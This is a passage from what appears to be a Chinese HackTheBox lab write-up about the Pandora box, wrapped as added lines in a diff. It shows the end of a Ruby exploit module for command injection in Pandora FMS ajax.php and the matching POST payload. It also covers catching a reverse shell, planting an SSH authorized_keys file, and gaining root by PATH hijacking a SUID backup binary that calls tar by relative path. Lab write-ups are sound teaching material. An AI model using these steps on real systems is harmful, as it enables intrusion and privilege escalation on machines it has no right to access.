+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">target_uri</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;ajax.php&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;cookie&#39;</span> <span class="o">=&gt;</span> <span class="nd">@cookie</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;ctype&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;Referer&#39;</span> <span class="o">=&gt;</span> <span class="n">full_uri</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;vars_get&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;sec&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;eventos&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;sec2&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;operation/events/events&#39;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">},</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;vars_post&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;page&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;include/ajax/events&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;perform_event_response&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;10000000&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;target&#39;</span> <span class="o">=&gt;</span> <span class="n">cmd</span><span class="o">.</span><span class="n">to_s</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;response_id&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1&#39;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># the server will not send a response, so the module shouldn&#39;t wait for one</span>
+</span></span><span class="line"><span class="cl">  <span class="n">end</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>http://127.0.0.1/pandora_console/ajax.php</code></p>
+<p>post传参<code>page=include/ajax/events&amp;perform_event_response=10000000&amp;target=ls&amp;response_id=1</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282346505.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282346505.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282346505.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282346505.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282346505.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282346505.png" /></p>
+<p>成功执行命令</p>
+<p>当前用户为<code>matt</code>,<code>uid=1000(matt) gid=1000(matt) groups=1000(matt)</code></p>
+<p>把shell反弹回本地</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291111365.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291111365.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291111365.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291111365.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291111365.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291111365.png" /></p>
+<p>在<code>~/.ssh</code>下面加个<code>authorized_keys</code>以便ssh连接</p>
+<h2 id="获取root权限">获取root权限</h2>
+<p>注意到在<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>中有个<code>/usr/bin/pandora_backup</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uid_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// ebx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">__uid_t</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setreuid</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;PandoraFMS Backup Utility&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now attempting to backup PandoraFMS client&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">system</span><span class="p">(</span><span class="s">&#34;tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Backup failed!</span><span class="se">\n</span><span class="s">Check your permissions!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Backup successful!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Terminating program!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>tar</code>是相对路径下的,把环境变量中的<code>PATH</code>修改到<code>/tmp</code>目录并且在<code>/tmp</code>下新建个<code>tar</code>的<code>/bin/bash</code>就ok了</p>
+<p><code>export PATH=/tmp:$PATH</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291132298.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291132298.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291132298.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291132298.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291132298.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291132298.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291133153.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291133153.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291133153.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291133153.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291133153.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291133153.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-01-10</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/htb-oopsie/" class="prev" rel="prev" title="HackTheBox-Oopsie"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox-Oopsie</a>
+            <a href="/htb-vaccine/" class="next" rel="next" title="HackTheBox-Vaccine">HackTheBox-Vaccine<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
